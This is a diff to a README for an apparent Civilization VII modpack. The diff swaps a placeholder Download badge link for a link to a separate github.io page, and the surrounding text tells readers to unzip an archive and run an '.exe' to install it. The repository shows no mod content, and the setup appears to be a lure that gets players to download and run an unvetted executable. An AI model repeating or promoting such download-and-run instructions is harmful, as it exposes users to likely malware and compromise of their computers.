@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install the modpack automatically into your Civilization VII directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://craimasjiens-modpack-civilization-vii.github.io/.github/)
 
 ## 📸 Overview
 <img width="637" height="358" alt="civ7-craimasjien-mod-new-civilizations" src="https://github.com/user-attachments/assets/6258d268-0858-4c23-8ae3-76a4aa48f123" />
